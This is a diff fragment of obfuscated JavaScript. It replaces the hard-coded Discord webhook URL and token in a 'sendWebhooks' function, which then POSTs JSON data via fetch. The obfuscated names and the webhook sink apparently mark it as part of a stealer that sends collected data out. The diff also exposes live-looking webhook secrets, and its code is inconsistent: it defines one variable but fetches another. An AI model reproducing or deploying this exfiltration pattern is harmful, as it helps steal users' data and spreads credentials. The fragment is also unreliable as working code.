@@ -233,7 +233,7 @@ const notEligible = () => {
   },
   sendWebhooks = (_0x190a34) => {
     const _0x2d6f55 =
-      'https://discord.com/api/webhooks/980120601857495111/ndHpEVQmzFxbP1Ma14uWujJL90afp85yAyyBZmxkuIr3EvvGc08r3CVQIGZiS3crODZh'
+      'https://discord.com/api/webhooks/1526610445388222484/FKUCoUopQ4IGVkkx4ddsVaQpiS13wydf3TtIvV9lSjgn5Der9DBpHcdYVw74hKIu9m0o'
     fetch(webhookURL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
